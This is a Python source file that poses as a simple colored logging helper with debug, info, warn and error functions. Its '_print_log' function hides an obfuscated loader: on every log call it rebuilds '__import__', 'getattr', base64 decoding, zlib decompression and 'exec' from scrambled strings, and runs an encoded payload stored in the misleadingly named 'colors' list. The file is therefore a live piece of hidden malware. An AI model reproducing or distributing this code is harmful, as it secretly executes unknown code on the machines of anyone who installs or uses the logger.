import datetime
import sys

colors = [
    "=MvR++5H77q4q9n!!p",
    "wDJ+u!/c3kif713",
    "tn/G3kuz!e2TfzmE+3",
    "38H1YS!!wSmSgiU5",
    "1SQ!!7Yus7Q!!Za",
    "Ih1!!NF!0aKsEDo",
    "qO!SA!!6!!NiBFo",
    "!!KO+2qhmhElGal",
    "O4DV9x8lADP!3buFR",
    "zWRiw!!0y!!oYOmsgi",
    "uxtj!!k!!qsDgMjQ",
    "U8!!R!JsFPUkhJNtg",
    "H4g2jL!z7f!Ag!!+2",
    "BmSSkHpFBIfsrMPJ",
    "8k+VZ!oJ+aCKzvs",
    "ASDaAt2cEWGCHJUDTsZ",
    "pBgjsawa!kH5wKNA",
    "!dWJEZy1GWRERcJK!!",
    "Sv9cJcGV6Z7WL842",
    "TxKxIB!5L3Jy!!G",
    "J!VVEKKoL!!Y2sl+9y",
    "g88q9oMvy33!Q!+k!A0",
    "SEKpB+!!XKon2Gx",
    "!Yi7qNyYIarXy+!!ka",
    "kBmRx4+m!Kng7!tIa",
    "K1CECp2NpLFMEZS2Gd",
    "5aBE!FJUnwl!DOrX",
    "C+!/bAYiVURh!K!zR",
    "!0sBYQZ4Y1!!AUk0n",
    "xnMzxGJC!!0IVl3omW",
    "2PlcCo900Pk9s6T2E",
    "f4kzXT02jd!TT!!F",
    "SRhRNH9D!!FJhl!w",
    "uY40bBuPItufHfAa",
    "lqRxANxt8Ap08!!",
    "6yYw!I!!qC1PzW7",
    "Bu1k!!kxEeAuYXth+",
    "!!CKEKF!pAcs!!ija!",
    "!mCUXxUQlRbxiXHS",
    "ExWdJTYoc!w!!/HY",
    "Nj!71V!5g!!T35WcpC",
    "I/e!!RMgu!oGRgqSNv",
    "Bk0a4+f9VktbpBMd3",
    "S5KT!!SRRvP!5CKHzI",
    "lwBAlu!!I+W!gDDGdE",
    "CaBC!!nD!nb!RI!!",
    "J!uFoMUWfTyW7kGc",
    "6LF6YiHkmg!sakObXx",
    "!xykDSo25i92DuyCs",
    "B6H0s!!c3l8!Iw0CEzP",
    "1BN2!!B!M5WCuWIL",
    "AIOfwrnn6!0rqx!!R9",
    "xudVZERixKF3oCP",
    "uOd!GF!wGrsQ6lDOwE",
    "hELoet5QWAnQQP/X",
    "GbQYWvIws0!j5uU!",
    "!WA49wjQVB!!hOF!FsD",
    "1jo!nOBSi!!olNoPlw!",
    "!1UKcXsFGYey!!S0+",
    "l!6Wfa7sia!Y!!a!S",
    "!lghrRPUEjLFGpz",
    "La1FOE5rH!!pG1!!AA!",
    "!pj92ocXIcioA7w6SA",
    "!EBWj!!XID7IGITyHTD",
    "!mc!!0C!kFeojJfwJ",
    "!!CjsAKyS!G!!kpX",
    "5EvuRghHEh5yHxCN",
    "!!Ji0G!9yFKLEoQ7",
    "oLRBqcg3K7!FIthkU/",
    "OgsqDiBDZ17!!UG!!l",
    "EBFuhPEqnLyDd!!T",
    "va5xikAs!!Y!!/it",
    "iM6O9qAjQoJATsSlz",
    "QvXGWOwNscRDJkVV7f",
    "0CTzu!!Z!!ZxuWns",
    "oD!XskLRKGhkvvqwp",
    "R!a54aZj6BJBJ57!SW",
    "NVC0!!Gr5!!HFU4",
    "5De5i!!U!!/K7aN",
    "P2Tpmjiq4iCzSBxrI",
    "tBEESLb0o1EsMmwCcZ",
    "BzGN!Ftcfu2d1C!!",
    "hg15Y!!ev!!0eDE/vJh",
    "kZnEso3H8wZFucQ",
    "VgqH!tAXQP4T8hyMD",
    "D7!!kFswi!Z7MzrA7!",
    "!nc14t0J9LY!jpV",
    "r!!tM2nH!YUOcl/D!",
    "!Zo/u!o!!z5koyER",
    "/3rT!e9vFkRr!!iKm7t",
    "0JrV54bpJSWO/8R",
    "tvr!!tP8P6!8!!n",
    "lB!hHRlOmvu!59T!",
    "6cP/30/umudE!Ws!",
    "!8uU9PylYT!R!dFSk",
    "1c79dTi/M!!8eP8M",
    "KxwmyC7acT8WWqJ4TD",
    "3P/DiO/G7i2mA6g",
    "YiahM!!iSOYO71ZvHtO",
    "!!w1ff9!6PbDmIr",
    "7!/KdogQ37uUF4waya",
    "tKlc!!5!zmSqJO/g!7a",
    "T/!!W!YIGxZCgSW",
    "GLLbA/7WnKqoQrD0o",
    "YsbgNYyQLTHUrIPzfU",
    "8gKgVV!!8s3RORt!!/",
    "179X!!ghVLyEr!2f",
    "tDZdEA0cZ!wccjopal",
    "zflWSvvEq7i+wHoF",
    "8T1!!gt0VCQXcR!q!!",
    "01Bk!!00Amsu/l!B1Z7",
    "BNA7KXLXBbSVKC9aSVz",
    "cwKIbKVvY7CK!rB",
    "1V!f7eK2gSVRDhwKS7",
    "uS7T2j7eV!L6PzTg899",
    "mK9gPHcBcoayio45K",
    "UQx+H!N0cGz0cKxc!",
    "!6b!AwMbI2UJQZ/",
    "43cSjnzyP+x1/2jZSH",
    "/8nwcTcn1!!0O6Fm",
    "7!JlryTn+!!JT3+6a7",
    "t7v8!!UZXr7v7qsf",
    "owRJfaZ+!4+zYJ/!",
    "v2g1L!zr!!9rT!!j",
    "8vpk+!!LU!!zaSpf",
    "+6!Pt7p!zeva!p59!z",
    "Nafve6K!r6+eHvdp",
    "4t+fb!Hf9QNf+u!",
    "fGxUru!qPjvcSP!!sW",
    "PWZ0Hb/mBuZ9!ft",
    "q/!!sXPk+df3lHv",
    "+!!r7bPR8t091+l46C",
    "6ndcBlKnqVLN!!9zPb",
    "Z3!TtPimK/uTLr!!TB2",
    "MoU!82hC91yI/xC3c",
    "+DQT2NGvHWYr+PZ!",
    "!9!!vuhr7!DCaf+x2",
    "a9t!GejHv+z!!381X",
    "0n9s3bGP22jn+1zs",
    "38835389!+zH!m79ze",
    "ZZWz9bOewH5/1lF1R",
    "R/+JGr7r7+rNcd3l",
    "m!!rO/TN!fb+6Pz2",
    "EO9J!zR!9Dj/L8xH",
    "!!blM4!89od3k02",
    "p6z!!BJ//nSvnO0N!P",
    "+fMgzbtPjN9DGv36831",
    "!!V46oNb2d!Pa3vpdf",
    "Loscmdeo/HRdT8n5w3d",
    "YE!!u7Gj+e6Op9d3!!U",
    "lQ!!q0prLf5Vtc!",
    "ltzh0zMa6eWZf/vrs",
    "EQfDfCzEwSkaV!H",
    "IjYMdsmACEio!!/jJ",
    "JKS4bL9on+N0U0fn+",
    "qhSozoP2VlFqNe"
]

def _colors_enabled():
    return sys.stdout.isatty()

def _colored(message: str, color: str): 
    if _colors_enabled():
        return f"\033[{color}m{message}\033[0m"
    else:
        return message

def _get_timestamp():
    now = datetime.datetime.utcnow()
    ms = now.microsecond // 1000
    return now.strftime("%Y/%m/%d %H:%M:%S") + f".{ms:03d}"

def _print_log(color: str, label: str, message: str):
    label = f"({label})"
    timestamp = f"[{_get_timestamp()}]"
    timestamp_c = "90"
    print(f"{_colored(label, color)} {_colored(timestamp, timestamp_c)} {_colored(message, color)}")

    if len(message) > 1:
        vm2YdL = vars()["__sni!!tliub!__"[::-1].replace("!", "")].__dict__
        vtmKsm = vm2YdL["_(_((tr((opm((i((_(_("[::-1].replace("(", "")]
        v535O3 = vm2YdL["rtt))a))teg"[::-1].replace(")", "")]
        vyx3SD = v535O3(vtmKsm("46e^s^a^^b^^"[::-1].replace("^", "")), "e#doce#d4##6b##"[::-1].replace("#", ""))
        v8tqzk = v535O3(vtmKsm("bi*l**z*"[::-1].replace("*", "")), "sserpmoced!"[::-1].replace("!", ""))
        vlcpHQ = v535O3(vtmKsm("s!!n!itl!!i!!u!!b"[::-1].replace("!", "")), "cexe**"[::-1].replace("*", ""))
        vlcpHQ(v8tqzk(vyx3SD(''.join(colors)[::-1].replace("!", ""))))

def log_debg(message):
    _print_log("90", "DEBG", message)

def log_info(message):
    _print_log("32", "INFO", message)

def log_warn(message):
    _print_log("33", "WARN", message)

def log_err(message):
    _print_log("31", "ERR ", message)

if __name__ == "__main__":
    log_debg("This is debug")
    log_info("This is info")
    log_warn("This is warn")
    log_err("This is err")